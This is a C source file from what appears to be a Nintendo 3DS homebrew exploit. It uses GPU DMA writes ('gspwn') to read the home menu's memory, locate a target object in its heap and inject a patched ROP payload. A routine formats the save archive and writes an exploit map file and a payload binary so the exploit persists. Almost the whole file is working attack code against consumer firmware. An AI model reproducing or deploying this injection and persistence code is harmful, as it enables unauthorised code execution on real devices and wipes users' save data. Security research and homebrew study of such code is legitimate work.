#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <ctr/types.h>
#include <ctr/srv.h>
#include <ctr/svc.h>
#include <ctr/APT.h>
#include <ctr/FS.h>
#include <ctr/GSP.h>
#include "text.h"
#include "menu_payload_loadropbin_bin.h"
#include "menu_microp_bin.h"

#include "../../../../build/constants.h"
#include "../../../../app_targets/app_targets.h"

Result _srv_RegisterClient(Handle* handleptr)
{
	u32* cmdbuf=getThreadCommandBuffer();
	cmdbuf[0]=0x10002; //request header code
	cmdbuf[1]=0x20;

	Result ret=0;
	if((ret=svc_sendSyncRequest(*handleptr)))return ret;

	return cmdbuf[1];
}

int _strlen(char* str)
{
	int l=0;
	while(*(str++))l++;
	return l;
}

void _strcpy(char* dst, char* src)
{
	while(*src)*(dst++)=*(src++);
	*dst=0x00;
}

Result _initSrv(Handle* srvHandle)
{
	Result ret=0;
	if(svc_connectToPort(srvHandle, "srv:"))return ret;
	return _srv_RegisterClient(srvHandle);
}

Result _srv_getServiceHandle(Handle* handleptr, Handle* out, char* server)
{
	u8 l=_strlen(server);
	if(!out || !server || l>8)return -1;

	u32* cmdbuf=getThreadCommandBuffer();

	cmdbuf[0]=0x50100; //request header code
	_strcpy((char*)&cmdbuf[1], server);
	cmdbuf[3]=l;
	cmdbuf[4]=0x0;

	Result ret=0;
	if((ret=svc_sendSyncRequest(*handleptr)))return ret;

	*out=cmdbuf[3];

	return cmdbuf[1];
}

Result GSP_FlushDCache(u32* addr, u32 size)
{
	Result (*_GSPGPU_FlushDataCache)(Handle* handle, Handle kprocess, u32* addr, u32 size)=(void*)CN_GSPGPU_FlushDataCache_ADR;
	Handle* gspHandle=(Handle*)CN_GSPHANDLE_ADR;
	return _GSPGPU_FlushDataCache(gspHandle, 0xFFFF8001, addr, size);
}

const char* const aptServiceNames[] = {"APT:U", "APT:A", "APT:S"};

#define _aptSessionInit() \
	int aptIndex; \
	for(aptIndex = 0; aptIndex < 3; aptIndex++)	if(!_srv_getServiceHandle(srvHandle, &aptuHandle, (char*)aptServiceNames[aptIndex]))break;\
	svc_closeHandle(aptuHandle);\

#define _aptOpenSession() \
	svc_waitSynchronization1(aptLockHandle, U64_MAX);\
	_srv_getServiceHandle(srvHandle, &aptuHandle, (char*)aptServiceNames[aptIndex]);\

#define _aptCloseSession()\
	svc_closeHandle(aptuHandle);\
	svc_releaseMutex(aptLockHandle);\

void doGspwn(u32* src, u32* dst, u32 size)
{
	#ifndef OTHERAPP
		Result (*nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue)(u32** sharedGspCmdBuf, u32* cmdAdr)=(void*)CN_nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue;
		u32 gxCommand[]=
		{
			0x00000004, //command header (SetTextureCopy)
			(u32)src, //source address
			(u32)dst, //destination address
			size, //size
			0xFFFFFFFF, // dim in
			0xFFFFFFFF, // dim out
			0x00000008, // flags
			0x00000000, //unused
		};

		u32** sharedGspCmdBuf=(u32**)(CN_GSPSHAREDBUF_ADR);
		nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue(sharedGspCmdBuf, gxCommand);
	#else
		Result (*gxcmd4)(u32 *src, u32 *dst, u32 size, u16 width0, u16 height0, u16 width1, u16 height1, u32 flags);
		u32 *paramblk = (u32*)*((u32*)0xFFFFFFC);
		gxcmd4=(void*)paramblk[0x1c>>2];
		gxcmd4(src, dst, size, 0, 0, 0, 0, 0x8);
	#endif
}

// Result _APT_HardwareResetAsync(Handle* handle)
// {
// 	u32* cmdbuf=getThreadCommandBuffer();
// 	cmdbuf[0]=0x4E0000; //request header code
	
// 	Result ret=0;
// 	if((ret=svc_sendSyncRequest(*handle)))return ret;
	
// 	return cmdbuf[1];
// }

// #ifndef OTHERAPP
//no idea what this does; apparently used to switch up save partitions
Result FSUSER_ControlArchive(Handle handle, FS_archive archive)
{
	u32* cmdbuf=getThreadCommandBuffer();

	u32 b1 = 0, b2 = 0;

	cmdbuf[0]=0x080d0144;
	cmdbuf[1]=archive.handleLow;
	cmdbuf[2]=archive.handleHigh;
	cmdbuf[3]=0x0;
	cmdbuf[4]=0x1; //buffer1 size
	cmdbuf[5]=0x1; //buffer1 size
	cmdbuf[6]=0x1a;
	cmdbuf[7]=(u32)&b1;
	cmdbuf[8]=0x1c;
	cmdbuf[9]=(u32)&b2;
 
	Result ret=0;
	if((ret=svc_sendSyncRequest(handle)))return ret;
 
	return cmdbuf[1];
}

Result FSUSER_FormatThisUserSaveData(Handle handle, u32 sizeblock, u32 countDirectoryEntry, u32 countFileEntry, u32 countDirectoryEntryBucket, u32 countFileEntryBucket, bool isDuplicateAll)
{
	u32* cmdbuf=getThreadCommandBuffer();

	cmdbuf[0]=0x080F0180;
	cmdbuf[1]=sizeblock;
	cmdbuf[2]=countDirectoryEntry;
	cmdbuf[3]=countFileEntry;
	cmdbuf[4]=countDirectoryEntryBucket;
	cmdbuf[5]=countFileEntryBucket;
	cmdbuf[6]=isDuplicateAll;
 
	Result ret=0;
	if((ret=svc_sendSyncRequest(handle)))return ret;
 
	return cmdbuf[1];
}

Result FSUSER_CreateDirectory(Handle handle, FS_archive archive, FS_path dirLowPath)
{
	u32 *cmdbuf = getThreadCommandBuffer();

	cmdbuf[0] = 0x08090182;
	cmdbuf[1] = 0;
	cmdbuf[2] = archive.handleLow;
	cmdbuf[3] = archive.handleHigh;
	cmdbuf[4] = dirLowPath.type;
	cmdbuf[5] = dirLowPath.size;
	cmdbuf[6] = 0;
	cmdbuf[7] = (dirLowPath.size << 14) | 0x2;
	cmdbuf[8] = (u32)dirLowPath.data;

	Result ret = 0;
	if((ret = svc_sendSyncRequest(handle)))return ret;

	return cmdbuf[1];
}

void installPayload(u32* payload, u32 payload_size)
{
	// install
	int state=0;
	Result ret;
	Handle fsuHandle=*(Handle*)CN_FSHANDLE_ADR;
	FS_archive saveArchive=(FS_archive){0x00000004, (FS_path){PATH_EMPTY, 1, (u8*)""}};
	u32 totalWritten1 = 0x0deaddad;
	u32 totalWritten2 = 0x1deaddad;
	Handle fileHandle;

	// format the shit out of the archive
	ret=FSUSER_FormatThisUserSaveData(fsuHandle, 0x200, 0x20, 0x40, 0x25, 0x43, true);
	state++; if(ret)goto installEnd;

	ret=FSUSER_OpenArchive(fsuHandle, &saveArchive);
	state++; if(ret)goto installEnd;

	ret=FSUSER_CreateDirectory(fsuHandle, saveArchive, FS_makePath(PATH_CHAR, "/edit/"));
	state++; if(ret)goto installEnd;

	// write exploit map file
	ret=FSUSER_OpenFile(fsuHandle, &fileHandle, saveArchive, FS_makePath(PATH_CHAR, "/edit/mslot0.map"), FS_OPEN_WRITE|FS_OPEN_CREATE, FS_ATTRIBUTE_NONE);
	state++; if(ret)goto installEnd;
	ret=FSFILE_Write(fileHandle, &totalWritten1, 0x0, (u32*)payload, payload_size, 0x10001);
	state++; if(ret)goto installEnd;
	ret=FSFILE_Close(fileHandle);
	state++; if(ret)goto installEnd;

	// write secondary payload file
	ret=FSUSER_OpenFile(fsuHandle, &fileHandle, saveArchive, FS_makePath(PATH_CHAR, "/edit/payload.bin"), FS_OPEN_WRITE|FS_OPEN_CREATE, FS_ATTRIBUTE_NONE);
	state++; if(ret)goto installEnd;
	ret=FSFILE_Write(fileHandle, &totalWritten2, 0x0, payload, payload_size, 0x10001);
	state++; if(ret)goto installEnd;
	ret=FSFILE_Close(fileHandle);
	state++; if(ret)goto installEnd;

	ret=FSUSER_ControlArchive(fsuHandle, saveArchive);
	state++; if(ret)goto installEnd;

	ret=FSUSER_CloseArchive(fsuHandle, &saveArchive);
	state++; if(ret)goto installEnd;

	installEnd:
	if(ret)
	{
		return;
	}
}
// #endif

Result _APT_ReceiveParameter(Handle* handle, u32 app_id)
{
	u32* cmdbuf=getThreadCommandBuffer();
	cmdbuf[0]=0xd0080; //request header code
	cmdbuf[1]=app_id;
	cmdbuf[2]=0x0;
	
	Result ret=0;
	if((ret=svc_sendSyncRequest(*handle)))return ret;

	return cmdbuf[1];
}

void inject_payload(u32* linear_buffer, u32 target_address)
{
	u32 target_base = target_address & ~0xFF;
	u32 target_offset = target_address - target_base;

	//read menu memory
	{
		GSP_FlushDCache(linear_buffer, 0x00001000);
		
		doGspwn((u32*)(target_base), linear_buffer, 0x00001000);
	}

	svc_sleepThread(10000000); //sleep long enough for memory to be read

	//patch memdump and write it
	{
		u32* payload_src;
		u32 payload_size;

		payload_src = (u32*)menu_payload_loadropbin_bin;
		payload_size = menu_payload_loadropbin_bin_size;

		u32* payload_dst = &(linear_buffer)[target_offset/4];

		//patch in payload
		int i;
		for(i=0; i<payload_size/4; i++)
		{
			if(payload_src[i] < 0xBABE0000+0x100 && payload_src[i] > 0xBABE0000-0x100)
			{
				payload_dst[i] = payload_src[i] + target_address - 0xBABE0000;
			}else if(payload_src[i] != 0xDEADCAFE) payload_dst[i] = payload_src[i];
		}

		GSP_FlushDCache(linear_buffer, 0x00001000);

		doGspwn(linear_buffer, (u32*)(target_base), 0x00001000);
	}

	svc_sleepThread(10000000); //sleep long enough for memory to be written
}

int main(u32 loaderparam, char** argv)
{
	Handle* gspHandle=(Handle*)CN_GSPHANDLE_ADR;
	u32* linear_buffer = (u32*)0x14100000;

	int line=10;

	//search for target object in home menu's linear heap
	const u32 start_addr = FIRM_LINEARSYSTEM;
	const u32 end_addr = FIRM_LINEARSYSTEM + 0x01000000;
	const u32 block_size = 0x00010000;
	const u32 block_stride = block_size-0x100; // keep some overlap to make sure we don't miss anything

	int targetProcessIndex = 1;

	// u32 binsize = (menu_microp_bin_size + 0xff) & ~0xff; // Align to 0x100-bytes.
	u32 binsize = 0x8000; // fuck modularity

	memcpy(linear_buffer, (u32*)menu_microp_bin, menu_microp_bin_size); // Copy menu_microp_bin into homemenu linearmem.

	// copy un-processed ropbin to backup location
	GSP_FlushDCache(linear_buffer, binsize);
	doGspwn(linear_buffer, (u32*)MENU_LOADEDROP_BKP_BUFADR, binsize);
	svc_sleepThread(100*1000*1000);

	patchPayload(linear_buffer, targetProcessIndex, NULL);

	GSP_FlushDCache(linear_buffer, binsize);
	doGspwn(linear_buffer, (u32*)MENU_LOADEDROP_BUFADR, binsize);
	svc_sleepThread(100*1000*1000);

	// copy parameter block
	memset(linear_buffer, 0x00, MENU_PARAMETER_SIZE);
	GSP_FlushDCache(linear_buffer, MENU_PARAMETER_SIZE);
	doGspwn(linear_buffer, (u32*)(MENU_PARAMETER_BUFADR), MENU_PARAMETER_SIZE);
	svc_sleepThread(20*1000*1000);

	int cnt = 0;
	u32 block_start;
	u32 target_address = start_addr;
	for(block_start=start_addr; block_start<end_addr; block_start+=block_stride)
	{
		//read menu memory
		{
			GSP_FlushDCache(linear_buffer, block_size);
			
			doGspwn((u32*)(block_start), linear_buffer, block_size);
		}

		svc_sleepThread(1000000); //sleep long enough for memory to be read

		int i;
		u32 end = block_size/4-0x10;
		for(i=0; i<end; i++)
		{
			const u32* adr = &(linear_buffer)[i];
			if(adr[2]==0x5544 && adr[3]==0x80 && adr[6]!=0x0 && adr[0x1F]==0x6E4C5F4E)break;
		}
		if(i<end)
		{
			// drawTitleScreen("searching for target...\n    target locked ! engaging.");

			target_address = block_start + i * 4;

			inject_payload(linear_buffer, target_address+0x18);

			block_start = target_address + 0x10 - block_stride;
			cnt++;
			break;
		}
	}

	svc_sleepThread(100000000); //sleep long enough for memory to be written

	while(1);
	return 0;
}
